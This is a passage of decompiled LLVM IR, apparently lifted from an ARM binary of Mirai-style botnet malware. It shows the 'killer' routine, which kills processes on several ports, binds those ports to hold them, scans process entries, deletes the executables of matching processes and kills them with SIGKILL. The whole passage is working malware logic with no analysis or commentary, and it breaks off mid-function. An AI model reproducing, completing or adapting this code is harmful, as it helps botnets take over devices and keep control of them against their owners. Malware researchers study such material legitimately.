  uselistorder label %dec_label_pc_cbd8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb80, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb64, { 1, 0 }
  uselistorder label %dec_label_pc_cb08, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca6c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca84, { 1, 0 }
  uselistorder label %dec_label_pc_ca28, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-8480 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-4328 = alloca i32, align 4
  %v3_cf10 = load i32, i32* @r4, align 4
  %v6_cf10 = load i32, i32* @r5, align 4
  %v9_cf10 = load i32, i32* @r6, align 4
  %v12_cf10 = load i32, i32* @r7, align 4
  %v15_cf10 = load i32, i32* @r8, align 4
  %v18_cf10 = load i32, i32* @sb, align 4
  %v21_cf10 = load i32, i32* @sl, align 4
  %v24_cf10 = load i32, i32* @fp, align 4
  %v27_cf10 = load i32, i32* @lr, align 4
  %v2_cf20 = call i32 @__GI_time(i32* null)
  store i32 %v2_cf20, i32* @r7, align 4
  %v0_cf28 = call i32 @__libc_fork()
  %v7_cf2c = icmp eq i32 %v0_cf28, -1
  %. = zext i1 %v7_cf2c to i32
  %tmp136 = icmp slt i32 %v0_cf28, 1
  %storemerge96 = select i1 %tmp136, i32 %., i32 1
  store i32 %storemerge96, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_243d8.69 to i32), i32* %r3.global-to-local, align 4
  %v2_cf48 = icmp eq i32 %storemerge96, 0
  store i32 %v0_cf28, i32* @global_var_243d8.69, align 4
  br i1 %v2_cf48, label %dec_label_pc_cf64, label %dec_label_pc_cf54

dec_label_pc_cf54:                                ; preds = %dec_label_pc_d080, %dec_label_pc_cf64, %entry
  %v1_cf60 = phi i32 [ %v2_d01c, %dec_label_pc_cf64 ], [ %v0_cf28, %entry ], [ 0, %dec_label_pc_d080 ]
  store i32 %v3_cf10, i32* @r4, align 4
  store i32 %v6_cf10, i32* @r5, align 4
  store i32 %v9_cf10, i32* @r6, align 4
  store i32 %v12_cf10, i32* @r7, align 4
  store i32 %v15_cf10, i32* @r8, align 4
  store i32 %v18_cf10, i32* @sb, align 4
  store i32 %v21_cf10, i32* @sl, align 4
  store i32 %v24_cf10, i32* @fp, align 4
  store i32 %v27_cf10, i32* @lr, align 4
  ret i32 %v1_cf60

dec_label_pc_cf64:                                ; preds = %entry
  %v1_cf68 = call i32 @sleep(i32 5)
  %v1_cf70 = call i32 @malloc(i32 4096)
  store i32 ptrtoint (i32* @global_var_218b8.71 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_243d4.73 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_cf70, i32* %r2.global-to-local, align 4
  %v0_cf80 = load i32, i32* @r5, align 4
  %v1_cf80 = trunc i32 %v0_cf80 to i8
  %v3_cf80 = inttoptr i32 %v1_cf70 to i8*
  store i8 %v1_cf80, i8* %v3_cf80, align 1
  %v0_cf88 = load i32, i32* @r5, align 4
  %v1_cf88 = load i32, i32* %r3.global-to-local, align 4
  %v2_cf88 = inttoptr i32 %v1_cf88 to i32*
  store i32 %v0_cf88, i32* %v2_cf88, align 4
  %v0_cf8c = load i32, i32* %r2.global-to-local, align 4
  %v1_cf8c = load i32, i32* %r1.global-to-local, align 4
  %v2_cf8c = inttoptr i32 %v1_cf8c to i32*
  store i32 %v0_cf8c, i32* %v2_cf8c, align 4
  %v1_cf90 = call i32 @table_unlock_val(i32 13)
  %v1_cf98 = call i32 @table_unlock_val(i32 14)
  %v2_cfa0 = ptrtoint i32* %stack_var_-4328 to i32
  store i32 %v2_cfa0, i32* %r2.global-to-local, align 4
  %v0_cfa4 = load i32, i32* @r5, align 4
  store i32 %v0_cfa4, i32* %r1.global-to-local, align 4
  %v2_cfb0 = inttoptr i32 %v0_cfa4 to i32*
  %v3_cfb0 = call i32 @table_retrieve_val(i32 13, i32* %v2_cfb0)
  %v1_cfb8 = add i32 %v2_cfa0, -56
  store i32 %v1_cfb8, i32* %r3.global-to-local, align 4
  store i32 %v3_cfb0, i32* %r1.global-to-local, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v2_cfc8 = inttoptr i32 %v1_cfb8 to i8*
  %v3_cfc8 = call i32 @util_strcpy(i8* %v2_cfc8, i32 %v3_cfb0)
  %v2_cfd0 = add i32 %v3_cfc8, %v1_cfb8
  store i32 %v2_cfd0, i32* @r4, align 4
  %v1_cfd4 = call i32 @__getpid(i32 %v3_cfc8)
  %v2_cfdc = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_cfdc, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_cfe4 = trunc i32 %v1_cfd4 to i8
  %v4_cfe4 = call i32 @util_itoa(i8 %v3_cfe4, i32 10, i32 %v2_cfdc)
  store i32 %v4_cfe4, i32* %r1.global-to-local, align 4
  %v0_cfec = load i32, i32* @r4, align 4
  store i32 %v0_cfec, i32* @r0, align 4
  %v2_cff0 = inttoptr i32 %v0_cfec to i8*
  %v3_cff0 = call i32 @util_strcpy(i8* %v2_cff0, i32 %v4_cfe4)
  %v0_cff4 = load i32, i32* @r5, align 4
  store i32 %v0_cff4, i32* %r1.global-to-local, align 4
  %v1_cff8 = load i32, i32* @r4, align 4
  %v2_cff8 = add i32 %v1_cff8, %v3_cff0
  store i32 %v2_cff8, i32* @r4, align 4
  %v2_d000 = inttoptr i32 %v0_cff4 to i32*
  %v3_d000 = call i32 @table_retrieve_val(i32 14, i32* %v2_d000)
  store i32 %v3_d000, i32* %r1.global-to-local, align 4
  %v0_d008 = load i32, i32* @r4, align 4
  store i32 %v0_d008, i32* @r0, align 4
  %v2_d00c = inttoptr i32 %v0_d008 to i8*
  %v3_d00c = call i32 @util_strcpy(i8* %v2_d00c, i32 %v3_d000)
  %v0_d010 = load i32, i32* @r5, align 4
  store i32 %v0_d010, i32* %r1.global-to-local, align 4
  store i32 %v3_d00c, i32* @r6, align 4
  %v2_d01c = call i32 @__libc_open(i32 %v1_cfb8, i32 %v0_d010)
  %v7_d020 = icmp eq i32 %v2_d01c, -1
  br i1 %v7_d020, label %dec_label_pc_cf54, label %dec_label_pc_d028

dec_label_pc_d028:                                ; preds = %dec_label_pc_cf64
  %v1_d028 = call i32 @__GI___libc_close(i32 %v2_d01c)
  %v1_d030 = call i32 @table_lock_val(i32 13)
  %v1_d038 = call i32 @table_lock_val(i32 14)
  store i32 ptrtoint (i32* @global_var_243d4.73 to i32), i32* @lr, align 4
  %v2_d044 = load i32, i32* @global_var_243d4.73, align 4
  store i32 %v2_d044, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d050 = call i32 @readlink(i32 %v1_cfb8, i32 %v2_d044, i32 4095)
  %v7_d054 = icmp eq i32 %v3_d050, -1
  br i1 %v7_d054, label %.thread9, label %bb139

bb139:                                            ; preds = %dec_label_pc_d028
  store i32 ptrtoint (i32* @global_var_243d4.73 to i32), i32* %r1.global-to-local, align 4
  %v3_d05c = load i32, i32* @global_var_243d4.73, align 4
  store i32 %v3_d05c, i32* %r3.global-to-local, align 4
  %v1_d060 = load i32, i32* @r5, align 4
  %v2_d060 = trunc i32 %v1_d060 to i8
  %v5_d060 = add i32 %v3_d05c, %v3_d050
  %v6_d060 = inttoptr i32 %v5_d060 to i8*
  store i8 %v2_d060, i8* %v6_d060, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d028, %bb139
  store i32 %v1_cfb8, i32* %r2.global-to-local, align 4
  %v0_d068 = load i32, i32* @r6, align 4
  %v1_d068 = load i32, i32* @r4, align 4
  %v1_cfb8.neg = sub i32 56, %v2_cfa0
  %v2_d068 = add i32 %v1_cfb8.neg, %v0_d068
  %v2_d06c = add i32 %v2_d068, %v1_d068
  store i32 %v2_d06c, i32* @r1, align 4
  store i32 %v1_cfb8, i32* @r0, align 4
  %v0_d074 = call i32 @util_zero()
  %v0_d078 = load i32, i32* @r5, align 4
  store i32 400, i32* @sl, align 4
  %v2_d110 = ptrtoint i32* %stack_var_-304 to i32
  %v2_d380 = ptrtoint i32* %stack_var_-224 to i32
  %v2_d38c = bitcast i32* %stack_var_-224 to i8*
  %v2_d3d0 = ptrtoint i32* %stack_var_-288 to i32
  %v2_d3d4 = bitcast i32* %stack_var_-288 to i8*
  %v2_d520 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d52c = ptrtoint i32* %stack_var_-48 to i32
  %v2_d544 = ptrtoint i32* %stack_var_-8480 to i32
  %v2_d290 = ptrtoint i32* %stack_var_-144 to i32
  %v2_d258 = ptrtoint i32* %stack_var_-128 to i32
  %v2_d220 = ptrtoint i32* %stack_var_-112 to i32
  %v2_d1ec = ptrtoint i32* %stack_var_-96 to i32
  %v2_d1b4 = ptrtoint i32* %stack_var_-80 to i32
  %v2_d16c = ptrtoint i32* %stack_var_-64 to i32
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d348, %.thread9
  %stack_var_-8484.0 = phi i32 [ %v0_d078, %.thread9 ], [ %stack_var_-8484.3, %dec_label_pc_d348 ]
  %v1_d084 = call i32 @table_unlock_val(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d090 = call i32 @table_retrieve_val(i32 13, i32* null)
  %v1_d094 = call i32 @__GI_opendir(i32 %v3_d090)
  store i32 %v1_d094, i32* @fp, align 4
  %v2_d098 = icmp eq i32 %v1_d094, 0
  br i1 %v2_d098, label %dec_label_pc_cf54, label %dec_label_pc_d0a0

dec_label_pc_d0a0:                                ; preds = %dec_label_pc_d080
  %v1_d0a4 = call i32 @table_lock_val(i32 13)
  %v1_d0b0 = call i32 @killer_kill_by_port(i32 58811)
  %v1_d0bc = call i32 @killer_kill_by_port(i32 add (i32 ptrtoint (i32* @global_var_c700.74 to i32), i32 7))
  %v1_d0c8 = call i32 @killer_kill_by_port(i32 14853)
  %v1_d0d0 = call i32 @killer_kill_by_port(i32 20480)
  %v1_d0dc = call i32 @killer_kill_by_port(i32 47873)
  %v1_d0e8 = call i32 @killer_kill_by_port(i32 57616)
  %v1_d0f4 = call i32 @killer_kill_by_port(i32 2842)
  %v1_d100 = call i32 @killer_kill_by_port(i32 10522)
  %v1_d108 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_d110, i32* @lr, align 4
  store i32 20480, i32* %r3.global-to-local, align 4
  store i32 24465, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d158 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d15c = icmp eq i32 %v3_d158, -1
  store i32 %v3_d158, i32* @r4, align 4
  br i1 %v7_d15c, label %dec_label_pc_d184, label %dec_label_pc_d168

dec_label_pc_d168:                                ; preds = %dec_label_pc_d0a0
  store i32 %v2_d16c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d174 = call i32 @bind(i32 %v3_d158, i32 %v2_d16c, i32 16)
  %v0_d178 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d180 = call i32 @listen(i32 %v0_d178, i32 1)
  br label %dec_label_pc_d184

dec_label_pc_d184:                                ; preds = %dec_label_pc_d0a0, %dec_label_pc_d168
  %v1_d188 = call i32 @killer_kill_by_port(i32 5888)
  %v2_d18c = icmp eq i32 %v1_d188, 0
  br i1 %v2_d18c, label %dec_label_pc_d64c, label %dec_label_pc_d194

dec_label_pc_d194:                                ; preds = %dec_label_pc_d670, %dec_label_pc_d660, %dec_label_pc_d64c, %dec_label_pc_d184, %dec_label_pc_d684
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d1a0 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d1a4 = icmp eq i32 %v3_d1a0, -1
  store i32 %v3_d1a0, i32* %r4.global-to-local, align 4
  br i1 %v7_d1a4, label %dec_label_pc_d1cc, label %dec_label_pc_d1b0

dec_label_pc_d1b0:                                ; preds = %dec_label_pc_d194
  store i32 %v2_d1b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1bc = call i32 @bind(i32 %v3_d1a0, i32 %v2_d1b4, i32 16)
  %v0_d1c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d1c8 = call i32 @listen(i32 %v0_d1c0, i32 1)
  br label %dec_label_pc_d1cc

dec_label_pc_d1cc:                                ; preds = %dec_label_pc_d194, %dec_label_pc_d1b0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d1d8 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d1dc = icmp eq i32 %v3_d1d8, -1
  store i32 %v3_d1d8, i32* %r4.global-to-local, align 4
  br i1 %v7_d1dc, label %dec_label_pc_d204, label %dec_label_pc_d1e8

dec_label_pc_d1e8:                                ; preds = %dec_label_pc_d1cc
  store i32 %v2_d1ec, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1f4 = call i32 @bind(i32 %v3_d1d8, i32 %v2_d1ec, i32 16)
  %v0_d1f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d200 = call i32 @listen(i32 %v0_d1f8, i32 1)
  br label %dec_label_pc_d204

dec_label_pc_d204:                                ; preds = %dec_label_pc_d1cc, %dec_label_pc_d1e8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d210 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d214 = icmp eq i32 %v3_d210, -1
  store i32 %v3_d210, i32* %r4.global-to-local, align 4
  br i1 %v7_d214, label %dec_label_pc_d238, label %dec_label_pc_d220

dec_label_pc_d220:                                ; preds = %dec_label_pc_d204
  store i32 %v2_d220, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d228 = call i32 @bind(i32 %v3_d210, i32 %v2_d220, i32 16)
  %v0_d22c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d234 = call i32 @listen(i32 %v0_d22c, i32 1)
  br label %dec_label_pc_d238

dec_label_pc_d238:                                ; preds = %dec_label_pc_d204, %dec_label_pc_d220
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d244 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d248 = icmp eq i32 %v3_d244, -1
  store i32 %v3_d244, i32* %r4.global-to-local, align 4
  br i1 %v7_d248, label %dec_label_pc_d270, label %dec_label_pc_d254

dec_label_pc_d254:                                ; preds = %dec_label_pc_d238
  store i32 %v2_d258, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d260 = call i32 @bind(i32 %v3_d244, i32 %v2_d258, i32 16)
  %v0_d264 = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d26c = call i32 @listen(i32 %v0_d264, i32 1)
  br label %dec_label_pc_d270

dec_label_pc_d270:                                ; preds = %dec_label_pc_d238, %dec_label_pc_d254
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d27c = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_d280 = icmp eq i32 %v3_d27c, -1
  store i32 %v3_d27c, i32* @r4, align 4
  br i1 %v7_d280, label %dec_label_pc_d2a8.preheader, label %dec_label_pc_d28c

dec_label_pc_d28c:                                ; preds = %dec_label_pc_d270
  store i32 %v2_d290, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d298 = call i32 @bind(i32 %v3_d27c, i32 %v2_d290, i32 16)
  %v0_d29c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d2a4 = call i32 @listen(i32 %v0_d29c, i32 1)
  br label %dec_label_pc_d2a8.preheader

dec_label_pc_d2a8.preheader:                      ; preds = %dec_label_pc_d28c, %dec_label_pc_d270
  %v0_d2a860 = load i32, i32* @fp, align 4
  %v1_d2ac61 = inttoptr i32 %v0_d2a860 to i32*
  %v2_d2ac62 = call i32 @__GI_readdir(i32* %v1_d2ac61)
  %v2_d2b064 = icmp eq i32 %v2_d2ac62, 0
  br i1 %v2_d2b064, label %dec_label_pc_d348, label %dec_label_pc_d2b8.preheader

dec_label_pc_d2b8.preheader:                      ; preds = %dec_label_pc_d2a8.preheader, %dec_label_pc_d2a8.backedge
  %v0_d2b872 = phi i32 [ %v2_d2ac, %dec_label_pc_d2a8.backedge ], [ %v2_d2ac62, %dec_label_pc_d2a8.preheader ]
  %stack_var_-8484.165 = phi i32 [ %stack_var_-8484.1.be, %dec_label_pc_d2a8.backedge ], [ %stack_var_-8484.0, %dec_label_pc_d2a8.preheader ]
  br label %dec_label_pc_d2b8

dec_label_pc_d2b8:                                ; preds = %dec_label_pc_d2b8.preheader, %dec_label_pc_d330
  %v0_d2c8 = phi i32 [ %v2_d33c, %dec_label_pc_d330 ], [ %v0_d2b872, %dec_label_pc_d2b8.preheader ]
  %stack_var_-8484.2 = phi i32 [ %v1_d2dc, %dec_label_pc_d330 ], [ %stack_var_-8484.165, %dec_label_pc_d2b8.preheader ]
  %v1_d2b8 = add i32 %v0_d2c8, 11
  %v2_d2b8 = inttoptr i32 %v1_d2b8 to i8*
  %v3_d2b8 = load i8, i8* %v2_d2b8, align 1
  %v4_d2b8 = zext i8 %v3_d2b8 to i32
  %v1_d2bc = add nsw i32 %v4_d2b8, -48
  store i32 %v1_d2bc, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d2bc, 9
  br i1 %tmp, label %dec_label_pc_d2a8.backedge, label %dec_label_pc_d2c8

dec_label_pc_d2c8:                                ; preds = %dec_label_pc_d2b8
  store i32 %v1_d2b8, i32* @r6, align 4
  store i32 %v1_d2b8, i32* @r0, align 4
  %v1_d2d0 = call i32 @atol(i32 %v1_d2b8)
  %v0_d2d8 = load i32, i32* @sl, align 4
  %v1_d2dc = add i32 %stack_var_-8484.2, 1
  store i32 %v1_d2d0, i32* @r8, align 4
  %v5_d2e8 = icmp slt i32 %v0_d2d8, %v1_d2d0
  %v2_d358 = call i32 @__GI_time(i32* null)
  br i1 %v5_d2e8, label %dec_label_pc_d354, label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d2c8
  %v0_d2f4 = load i32, i32* @r7, align 4
  %v2_d2f4 = sub i32 %v2_d358, %v0_d2f4
  %v7_d2fc = icmp slt i32 %v2_d2f4, 601
  br i1 %v7_d2fc, label %dec_label_pc_d304, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d2ec
  store i32 400, i32* @sl, align 4
  br label %dec_label_pc_d2a8.backedge

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2ec
  %v0_d304 = load i32, i32* @r8, align 4
  %v7_d308 = icmp slt i32 %v0_d304, 401
  br i1 %v7_d308, label %dec_label_pc_d2a8.backedge, label %dec_label_pc_d30c

dec_label_pc_d30c:                                ; preds = %dec_label_pc_d304
  store i32 %v1_d2dc, i32* @lr, align 4
  %v3_d314 = zext i32 %v1_d2dc to i64
  %v4_d314 = mul nuw i64 %v3_d314, 3435973837
  %v3_d3181 = udiv i64 %v4_d314, 34359738368
  %v3_d31c3 = mul nuw nsw i64 %v3_d3181, 8
  %v3_d31c = trunc i64 %v3_d31c3 to i32
  store i32 %v3_d31c, i32* %r3.global-to-local, align 4
  %v2_d3205 = mul nuw nsw i64 %v3_d3181, 2
  %v2_d320 = trunc i64 %v2_d3205 to i32
  %v2_d324 = add i32 %v3_d31c, %v2_d320
  store i32 %v2_d324, i32* %r2.global-to-local, align 4
  %v9_d328 = icmp eq i32 %v1_d2dc, %v2_d324
  br i1 %v9_d328, label %dec_label_pc_d330, label %dec_label_pc_d2a8.backedge

dec_label_pc_d330:                                ; preds = %dec_label_pc_d30c
  %v1_d334 = call i32 @sleep(i32 1)
  %v0_d338 = load i32, i32* @fp, align 4
  %v1_d33c = inttoptr i32 %v0_d338 to i32*
  %v2_d33c = call i32 @__GI_readdir(i32* %v1_d33c)
  %v2_d340 = icmp eq i32 %v2_d33c, 0
  br i1 %v2_d340, label %dec_label_pc_d348, label %dec_label_pc_d2b8

dec_label_pc_d348:                                ; preds = %dec_label_pc_d2a8.backedge, %dec_label_pc_d330, %dec_label_pc_d2a8.preheader
  %stack_var_-8484.3 = phi i32 [ %stack_var_-8484.0, %dec_label_pc_d2a8.preheader ], [ %v1_d2dc, %dec_label_pc_d330 ], [ %stack_var_-8484.1.be, %dec_label_pc_d2a8.backedge ]
  %v0_d348 = load i32, i32* @fp, align 4
  %v1_d34c = inttoptr i32 %v0_d348 to i32*
  %v2_d34c = call i32 @__GI_closedir(i32* %v1_d34c)
  br label %dec_label_pc_d080

dec_label_pc_d354:                                ; preds = %dec_label_pc_d2c8
  %v1_d364 = call i32 @table_unlock_val(i32 13)
  %v1_d36c = call i32 @table_unlock_val(i32 14)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d378 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v2_d380, i32* @sb, align 4
  store i32 %v3_d378, i32* %r1.global-to-local, align 4
  store i32 %v2_d380, i32* @r0, align 4
  %v3_d38c = call i32 @util_strcpy(i8* %v2_d38c, i32 %v3_d378)
  %v1_d390 = load i32, i32* @sb, align 4
  %v2_d390 = add i32 %v1_d390, %v3_d38c
  store i32 %v2_d390, i32* %r5.global-to-local, align 4
  %v0_d394 = load i32, i32* @r6, align 4
  store i32 %v0_d394, i32* %r1.global-to-local, align 4
  store i32 %v2_d390, i32* @r0, align 4
  %v2_d39c = inttoptr i32 %v2_d390 to i8*
  %v3_d39c = call i32 @util_strcpy(i8* %v2_d39c, i32 %v0_d394)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d39c, i32* %r4.global-to-local, align 4
  %v3_d3ac = call i32 @table_retrieve_val(i32 14, i32* null)
  store i32 %v3_d3ac, i32* %r1.global-to-local, align 4
  %v1_d3b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_d3b4 = add i32 %v1_d3b4, %v3_d39c
  store i32 %v2_d3b4, i32* @r0, align 4
  %v2_d3b8 = inttoptr i32 %v2_d3b4 to i8*
  %v3_d3b8 = call i32 @util_strcpy(i8* %v2_d3b8, i32 %v3_d3ac)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d3c4 = call i32 @table_retrieve_val(i32 13, i32* null)
  store i32 %v3_d3c4, i32* %r1.global-to-local, align 4
  store i32 %v2_d3d0, i32* @r0, align 4
  %v3_d3d4 = call i32 @util_strcpy(i8* %v2_d3d4, i32 %v3_d3c4)
  %v2_d3e0 = add i32 %v3_d3d4, %v2_d3d0
  store i32 %v2_d3e0, i32* @r5, align 4
  store i32 %v2_d3e0, i32* @r0, align 4
  %v0_d3e8 = load i32, i32* @r6, align 4
  store i32 %v0_d3e8, i32* %r1.global-to-local, align 4
  %v2_d3ec = inttoptr i32 %v2_d3e0 to i8*
  %v3_d3ec = call i32 @util_strcpy(i8* %v2_d3ec, i32 %v0_d3e8)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d3ec, i32* @r4, align 4
  %v3_d3fc = call i32 @table_retrieve_val(i32 29, i32* null)
  store i32 %v3_d3fc, i32* %r1.global-to-local, align 4
  %v0_d404 = load i32, i32* @r4, align 4
  %v1_d404 = load i32, i32* @r5, align 4
  %v2_d404 = add i32 %v1_d404, %v0_d404
  store i32 %v2_d404, i32* @r0, align 4
  %v2_d408 = inttoptr i32 %v2_d404 to i8*
  %v3_d408 = call i32 @util_strcpy(i8* %v2_d408, i32 %v3_d3fc)
  %v1_d410 = call i32 @table_lock_val(i32 13)
  %v1_d418 = call i32 @table_lock_val(i32 14)
  store i32 %v1_cfb8, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d42c = call i32 @readlink(i32 %v2_d380, i32 %v1_cfb8, i32 4095)
  %v7_d430 = icmp eq i32 %v3_d42c, -1
  store i32 %v3_d42c, i32* @r5, align 4
  br i1 %v7_d430, label %dec_label_pc_d4f4, label %dec_label_pc_d43c

dec_label_pc_d43c:                                ; preds = %dec_label_pc_d354
  store i32 %v1_cfb8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d444 = add i32 %v3_d42c, %v1_cfb8
  %v5_d444 = inttoptr i32 %v4_d444 to i8*
  store i8 0, i8* %v5_d444, align 1
  %v1_d44c = call i32 @table_unlock_val(i32 30)
  %v0_d450 = load i32, i32* @r4, align 4
  store i32 %v0_d450, i32* %r1.global-to-local, align 4
  %v2_d458 = inttoptr i32 %v0_d450 to i32*
  %v3_d458 = call i32 @table_retrieve_val(i32 30, i32* %v2_d458)
  %v0_d45c = load i32, i32* @r5, align 4
  %v1_d45c = add i32 %v0_d45c, -1
  store i32 %v1_d45c, i32* @r1, align 4
  store i32 %v3_d458, i32* %r2.global-to-local, align 4
  %v4_d468 = call i32 @util_stristr(i8* %v2_cfc8, i32 %v1_d45c, i32 %v3_d458)
  %v7_d46c = icmp eq i32 %v4_d468, -1
  br i1 %v7_d46c, label %dec_label_pc_d488, label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d43c
  %v1_d478 = call i32 @unlink(i32 %v1_cfb8)
  %v0_d47c = load i32, i32* @r8, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d484 = call i32 @kill(i32 %v0_d47c, i32 9)
  br label %dec_label_pc_d488

dec_label_pc_d488:                                ; preds = %dec_label_pc_d43c, %dec_label_pc_d474
  %v1_d48c = call i32 @table_lock_val(i32 30)
  %v1_d490 = call i32 @__getpid(i32 %v1_d48c)
  store i32 %v1_d490, i32* @r0, align 4
  %v1_d494 = load i32, i32* @r8, align 4
  %v9_d494 = icmp eq i32 %v1_d490, %v1_d494
  br i1 %v9_d494, label %dec_label_pc_d4c0, label %dec_label_pc_d49c

dec_label_pc_d49c:                                ; preds = %dec_label_pc_d488
  %v0_d49c = call i32 @getppid()
  %v1_d4a0 = load i32, i32* @r8, align 4
  %v9_d4a0 = icmp eq i32 %v0_d49c, %v1_d4a0
  br i1 %v9_d4a0, label %dec_label_pc_d4c0, label %dec_label_pc_d4a8

dec_label_pc_d4a8:                                ; preds = %dec_label_pc_d49c
  store i32 ptrtoint (i32* @global_var_243d4.73 to i32), i32* %r3.global-to-local, align 4
  %v2_d4b0 = load i32, i32* @global_var_243d4.73, align 4
  store i32 %v2_d4b0, i32* %r1.global-to-local, align 4
  %v3_d4b4 = call i32 @util_strcmp(i8* %v2_cfc8, i32 %v2_d4b0)
  %v2_d4b8 = icmp eq i32 %v3_d4b4, 0
  br i1 %v2_d4b8, label %dec_label_pc_d4cc, label %dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge

dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge:    ; preds = %dec_label_pc_d4a8
  %v0_d4c4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge, %dec_label_pc_d49c, %dec_label_pc_d488
  %v0_d4c4 = phi i32 [ %v0_d4c4.pre, %dec_label_pc_d4a8.dec_label_pc_d4c0_crit_edge ], [ %v0_d49c, %dec_label_pc_d49c ], [ %v1_d490, %dec_label_pc_d488 ]
  store i32 %v2_d358, i32* @r7, align 4
  store i32 %v0_d4c4, i32* @sl, align 4
  br label %dec_label_pc_d2a8.backedge

dec_label_pc_d2a8.backedge:                       ; preds = %dec_label_pc_d30c, %dec_label_pc_d304, %dec_label_pc_d2b8, %dec_label_pc_d4c0, %dec_label_pc_d61c, %.thread10
  %stack_var_-8484.1.be = phi i32 [ %v1_d2dc, %dec_label_pc_d61c ], [ %v1_d2dc, %dec_label_pc_d4c0 ], [ %v1_d2dc, %.thread10 ], [ %stack_var_-8484.2, %dec_label_pc_d2b8 ], [ %v1_d2dc, %dec_label_pc_d304 ], [ %v1_d2dc, %dec_label_pc_d30c ]
  %v0_d2a8 = load i32, i32* @fp, align 4
  %v1_d2ac = inttoptr i32 %v0_d2a8 to i32*
  %v2_d2ac = call i32 @__GI_readdir(i32* %v1_d2ac)
  %v2_d2b0 = icmp eq i32 %v2_d2ac, 0
  br i1 %v2_d2b0, label %dec_label_pc_d348, label %dec_label_pc_d2b8.preheader

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d4a8
